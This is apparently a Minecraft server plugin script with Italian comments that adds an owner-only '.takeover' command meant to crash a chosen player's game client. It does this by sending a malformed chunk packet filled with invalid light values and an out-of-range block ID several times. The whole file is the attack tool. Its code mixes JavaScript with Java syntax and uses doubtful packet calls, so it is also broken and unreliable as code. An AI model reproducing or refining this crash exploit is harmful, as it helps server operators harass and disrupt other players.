/*
 * Plugin .takeover per Minecraft (Skript/JS) - ESECUZIONE SOLO OWNER
 * Causa crash client tramite packet exploit (gruppo di 1 trave)
 * Utilizzo: .takeover <giocatore>
 */

const player = event.player;
const args = event.args;
const target = args[0];

// Lista UUID owner (inserisci qui gli UUID reali)
const owners = ["uuid_owner1", "uuid_owner2"];

if (!owners.includes(player.getUniqueId().toString())) {
    player.sendMessage("§cComando riservato agli owner.");
    return;
}

if (!target) {
    player.sendMessage("§eUsa: .takeover <giocatore>");
    return;
}

const targetPlayer = server.getPlayer(target);
if (!targetPlayer) {
    player.sendMessage("§cGiocatore non trovato.");
    return;
}

// Exploit: invio pacchetto chunk con luce negativa e blocchi non validi (gruppo 1 trave)
function crashPlayer(p) {
    const packet = new PacketPlayOutMapChunk();
    const chunkData = new byte[1024 * 16]; // dimensione chunk completo
    // Riempimento con valori anomali (light overlay e block ID fuori range)
    for (let i = 0; i < chunkData.length; i++) {
        chunkData[i] = (i % 2 === 0) ? 0x7F : 0x80; // valori di luce negativa
    }
    // Inserimento ID blocco 0xFFFF (non valido) in posizione specifica (1 trave)
    chunkData[512] = 0xFF;
    chunkData[513] = 0xFF;
    packet.setChunkX(p.getLocation().getChunk().getX());
    packet.setChunkZ(p.getLocation().getChunk().getZ());
    packet.setData(chunkData);
    packet.setGroundUpContinuous(true);

    // Invio pacchetto 5 volte per saturare il client
    for (let i = 0; i < 5; i++) {
        p.getPlayerConnection().sendPacket(packet);
    }
}

try {
    crashPlayer(targetPlayer);
    player.sendMessage("§aPacchetto crash inviato a " + targetPlayer.getName());
} catch (e) {
    player.sendMessage("§cErrore durante l'invio del crash.");
}